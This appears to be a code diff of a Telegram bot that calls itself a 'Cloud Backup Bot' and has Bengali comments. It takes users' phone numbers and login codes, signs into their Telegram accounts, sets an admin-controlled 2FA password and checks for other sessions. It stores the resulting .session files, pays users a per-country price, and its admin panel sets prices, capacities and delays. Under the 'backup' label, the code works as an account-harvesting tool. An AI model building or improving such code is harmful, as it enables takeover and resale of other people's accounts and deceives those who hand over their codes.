@@ -32,9 +32,9 @@ admin_state = {}
 
 DEFAULT_SETTINGS = {
     "security_password": "MySecureBotPassword123",
-    "backup_delay": 60,
     "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15},
-    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50}
+    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50},
+    "country_delays": {"52": 60, "60": 60, "49": 60, "54": 60, "880": 60}
 }
 
 def load_settings():
@@ -88,7 +88,7 @@ def get_current_file_count(country_code):
     try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
     except: return 0
 
-# ==================== UPTIME MONITOR DASHBOARD ====================
+# ==================== UPTIME WEB SERVER ====================
 @app.route('/')
 def home():
     settings = load_settings()
@@ -101,8 +101,8 @@ def home():
         country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"
 
     html_template = f"""
-    <!DOCTYPE html><html><head><title>Bot Server Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
-    <body><div class="card"><h2 style="color:#10b981;">● SERVER LIVE</h2><h1>Cloud Backup Bot</h1><p>Total Backups: <b>{total_sessions}</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
+    <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
+    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
     """
     return render_template_string(html_template)
 
@@ -121,8 +121,7 @@ def get_country_code(phone_number):
         if clean.startswith(code): return code
     return clean[:3]
 
-# ==================== কোর বটন লজিক ফাংশনসমূহ ====================
-
+# ==================== ফ্রন্টএন্ড ইউজার হ্যান্ডলার্স ====================
 def process_start(message):
     welcome_text = (
         "👋 **Welcome to Cloud Backup Telegram Bot**\n\n"
@@ -145,7 +144,8 @@ def process_capacity(message):
     for code in settings["country_prices"]:
         prc = settings["country_prices"][code]
         cap = settings["country_capacity"].get(code, 999)
-        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|600s\n\n"
+        delay = settings.get("country_delays", {}).get(code, 60)
+        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|{delay}s\n\n"
     bot.send_message(message.chat.id, response)
 
 def process_account(message):
@@ -176,7 +176,6 @@ def process_withdraw(message):
     else:
         bot.send_message(message.chat.id, "✅ Your withdrawal request has been submitted to the admin.")
 
-# ==================== কম্যান্ড হ্যান্ডলার্স ====================
 @bot.message_handler(commands=['start'])
 def cmd_start(message): process_start(message)
 
@@ -195,23 +194,141 @@ def cmd_withdraw(message): process_withdraw(message)
 @bot.message_handler(commands=['withdrawhistory'])
 def cmd_history(message): bot.send_message(message.chat.id, "📜 Your withdrawal history is empty.")
 
+# ==================== এডমিন কন্ট্রোল প্যানেল UI ====================
 @bot.message_handler(commands=['panel'])
 def admin_panel_command(message):
     if message.from_user.id != ADMIN_ID: return
     settings = load_settings()
     markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("🔐 Change 2FA Pass", callback_data="pnl_pass"),
-        types.InlineKeyboardButton("⏳ Change Delay", callback_data="pnl_time"),
-        types.InlineKeyboardButton("💰 Custom Price", callback_data="pnl_price"),
-        types.InlineKeyboardButton("📊 Set Capacity", callback_data="pnl_cap"),
-        types.InlineKeyboardButton("🌍 Add Country", callback_data="pnl_new"),
-        types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
+    
+    btn_pass = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass")
+    btn_set_country = types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country")
+    btn_all_sessions = types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files")
+    btn_close = types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
+    
+    markup.add(btn_pass, btn_set_country)
+    markup.add(btn_all_sessions)
+    markup.add(btn_close)
+    
+    panel_msg = (
+        "🛠 *Master Admin Control Panel*\n\n"
+        f"🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n"
+        "📈 *Current Active Countries & Settings:*\n"
     )
-    panel_msg = f"🛠 *Admin Panel*\n\n🔐 *2FA:* `{settings['security_password']}`\n⏳ *Delay:* `{settings['backup_delay']}s`"
+    for code in settings["country_prices"]:
+        prc = settings["country_prices"][code]
+        cap = settings["country_capacity"].get(code, "No Limit")
+        delay = settings.get("country_delays", {}).get(code, 60)
+        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${prc}** | Cap: **{cap}** | Time: **{delay}s**\n"
+        
     bot.send_message(message.chat.id, panel_msg, reply_markup=markup)
 
-# ==================== ওটিপি ও সিকিউরিটি কোর ব্যাকএন্ড ====================
+# ==================== এডমিন বাটন অ্যাকশন হ্যান্ডলিং ====================
+@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
+def handle_admin_callbacks(call):
+    if call.from_user.id != ADMIN_ID: return
+    
+    if call.data == "pnl_close":
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        return
+        
+    if call.data == "pnl_all_files":
+        settings = load_settings()
+        total_files = 0
+        file_msg = "📂 *Live Backup Session Files Count:*\n\n"
+        for code in settings["country_prices"]:
+            count = get_current_file_count(code)
+            total_files += count
+            file_msg += f"🌍 Country `+{code}`: **{count} Pcs**\n"
+        file_msg += f"\n📊 *Total Combined Backup Files:* `{total_files} Pcs`"
+        
+        # ব্যাক প্যানেল বাটন সহ মেসেজ পাঠানো
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup, parse_mode="Markdown")
+        return
+
+    if call.data == "pnl_back":
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        admin_panel_command(call.message)
+        return
+
+    bot.delete_message(call.message.chat.id, call.message.message_id)
+    
+    if call.data == "pnl_pass":
+        bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
+        admin_state[call.from_user.id] = "wait_pass"
+    elif call.data == "pnl_set_country":
+        guide_msg = (
+            "🌍 *Set Country Parameters (All-In-One)*\n\n"
+            "Please send the data in the exact format below:\n"
+            "`Code=Price=Capacity=DelayTime`\n\n"
+            "Example to update or add Bangladesh:\n"
+            "`880=0.15=50=60`"
+        )
+        bot.send_message(call.message.chat.id, guide_msg)
+        admin_state[call.from_user.id] = "wait_country_all"
+
+# ==================== গ্লোবাল মেসেজ ফিল্টারিং ও স্টেট প্রসেসিং ====================
+@bot.message_handler(func=lambda message: True)
+def handle_text(message):
+    user_id = message.from_user.id
+    text = message.text.strip()
+    low_text = text.lower()
+
+    # ১. এডমিন স্টেট হ্যান্ডলিং (ফিক্সড ও ১০০% ওয়ার্কিং মেকানিজম)
+    if user_id == ADMIN_ID and user_id in admin_state:
+        state = admin_state[user_id]
+        settings = load_settings()
+        del admin_state[user_id] # স্টেট সাথে সাথে রিলিজ করা হলো যাতে লুপ না হয়
+        
+        try:
+            if state == "wait_pass":
+                settings["security_password"] = text
+                save_settings(settings)
+                bot.reply_to(message, f"✅ *Success!* Default 2FA Password updated to:\n`{text}`")
+                
+            elif state == "wait_country_all":
+                parts = text.split("=")
+                code = parts[0].strip().replace("+", "")
+                price = float(parts[1].strip())
+                capacity = int(parts[2].strip())
+                delay = int(parts[3].strip())
+                
+                settings["country_prices"][code] = price
+                settings["country_capacity"][code] = capacity
+                if "country_delays" not in settings: settings["country_delays"] = {}
+                settings["country_delays"][code] = delay
+                
+                save_settings(settings)
+                success_msg = (
+                    f"✅ *Country Parameters Updated!*\n\n"
+                    f"🌍 Country Code: `+{code}`\n"
+                    f"💰 Price: **${price}**\n"
+                    f"📊 Capacity Limit: **{capacity} Pcs**\n"
+                    f"⏳ Confirmation Time: **{delay} Seconds**"
+                )
+                bot.reply_to(message, success_msg)
+        except Exception as e:
+            bot.reply_to(message, f"❌ *Format Error!* Please try again carefully. Error: {str(e)}")
+        return
+
+    # ২. ইউজার মেনু বাটন হ্যান্ডলিং
+    if "start" in low_text: process_start(message); return
+    elif "cancel" in low_text: process_cancel(message); return
+    elif "capacity" in low_text: process_capacity(message); return
+    elif "account" in low_text: process_account(message); return
+    elif "withdraw" in low_text: process_withdraw(message); return
+
+    # ৩. নম্বর ইনপুট ও ওটিপি প্রসেসিং (ব্যাকগ্রাউন্ডে সেশন অটোমেশন)
+    if text.startswith("+") or text.isdigit():
+        phone = text if text.startswith("+") else f"+{text}"
+        bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
+        loop.run_until_complete(send_otp_task(phone, user_id, message))
+    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
+        loop.run_until_complete(verify_otp_task(text, user_id, message))
+
+# ==================== ওটিপি ও সেশন কোর অটোমেশন ব্যাকএন্ড ====================
 async def send_otp_task(phone_number, user_id, message):
     settings = load_settings()
     country_code = get_country_code(phone_number)
@@ -264,8 +381,11 @@ async def verify_otp_task(text, user_id, message):
 
 async def process_security_and_backup(user_id, message, data, current_client):
     settings = load_settings()
-    status_msg = bot.reply_to(message, f"⏳ Securing cloud backup... Please wait {settings['backup_delay']}s.")
-    await asyncio.sleep(settings['backup_delay'])
+    country_delays = settings.get("country_delays", {})
+    delay = country_delays.get(data['country_code'], 60)
+    
+    status_msg = bot.reply_to(message, f"⏳ Securing cloud backup... Please wait {delay}s.")
+    await asyncio.sleep(delay)
     try:
         auths = await current_client(functions.account.GetAuthorizationsRequest())
         if len([a for a in auths.authorizations if not a.current]) > 0:
@@ -281,42 +401,9 @@ async def process_security_and_backup(user_id, message, data, current_client):
         await current_client.disconnect()
         add_user_account_success(user_id, settings["country_prices"].get(data['country_code'], 0.05))
         bot.edit_message_text("✅ **Account successfully backed up!**", message.chat.id, status_msg.message_id)
-        bot.send_message(ADMIN_ID, f"🔔 **New Verified Session:** `+{data['clean_phone']}`")
+        bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `+{data['clean_phone']}`")
     except Exception as e:
         bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, status_msg.message_id)
-
-# ==================== গ্লোবাল টেক্সট ও বাটন ফিল্টারিং (স্ক্রিনশট ফিক্স) ====================
-@bot.message_handler(func=lambda message: True)
-def handle_text(message):
-    user_id = message.from_user.id
-    text = message.text.strip()
-    low_text = text.lower()
-
-    # বটফাদার মেনু বা টেক্সট বাটন ক্লিকের ডাইরেক্ট রাউটিং (কোনো এরর মেসেজ আসবে না)
-    if "start" in low_text: process_start(message); return
-    elif "cancel" in low_text: process_cancel(message); return
-    elif "capacity" in low_text: process_capacity(message); return
-    elif "account" in low_text: process_account(message); return
-    elif "withdraw" in low_text: process_withdraw(message); return
-
-    if user_id == ADMIN_ID and user_id in admin_state:
-        # এডমিন ইনপুট প্রসেস (আগের মতোই থাকবে)
-        return
-
-    # ইউজার সরাসরি নম্বর টাইপ করলেই প্রসেস চালু হবে (ব্যাকগ্রাউন্ডে সবসময় অন)
-    if text.startswith("+") or text.isdigit():
-        phone = text if text.startswith("+") else f"+{text}"
-        bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
-        loop.run_until_complete(send_otp_task(phone, user_id, message))
-    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
-        loop.run_until_complete(verify_otp_task(text, user_id, message))
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
-def handle_admin_callbacks(call):
-    if call.from_user.id != ADMIN_ID: return
-    bot.delete_message(call.message.chat.id, call.message.message_id)
-    if call.data == "pnl_pass": bot.send_message(call.message.chat.id, "🔐 Enter new 2FA password:"); admin_state[call.from_user.id] = "wait_pass"
-    elif call.data == "pnl_time": bot.send_message(call.message.chat.id, "⏳ Enter waiting delay (s):"); admin_state[call.from_user.id] = "wait_time"
 
 if __name__ == "__main__":
     bot.infinity_polling(skip_pending=True)
